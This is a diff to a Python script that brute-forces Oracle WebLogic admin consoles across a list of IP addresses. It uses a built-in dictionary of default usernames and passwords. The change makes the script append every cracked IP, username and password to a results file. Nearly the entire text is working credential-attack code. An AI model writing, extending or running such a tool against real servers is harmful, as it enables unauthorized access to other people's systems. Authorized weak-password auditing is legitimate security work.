@@ -18,6 +18,7 @@ logging.basicConfig(filename='weblogicpwdd.log', level=logging.INFO)
 headers = {'user-agent': 'ceshi/0.0.1'}
 
 filename = 'ip.txt'
+resname = 'res.txt'
 
 userdict = ['WebLogic', 'weblogic', 'Oracle@123', 'password', 'system', 'Administrator', 'admin', 'security', 'joe',
                 'wlcsystem', 'wlpisystem']
@@ -45,8 +46,10 @@ def weakPasswd(ip,q):
                 if req.status_code == 302 and 'console' in req.text and 'LoginForm.jsp' not in req.text:
                     logging.info('[+] Congratulations! Target Weblogic: ' + ip + ' username: ' + user + '  password: ' + pwd)
                     print('[+] Congratulations! Target Weblogic: ' + ip + ' username: ' + user + '  password: ' + pwd)
+                    fw = open(resname, 'a')
+                    fw.write('[+] Congratulations! Target Weblogic: ' + ip + ' username: ' + user + '  password: ' + pwd + '\n')
+                    fw.close()
                     break
-
         print('[*] Target Weblogic: ' + ip + ' finished... ...')
         logging.info('[*] Target Weblogic: ' + ip + ' finished... ...')
     except:
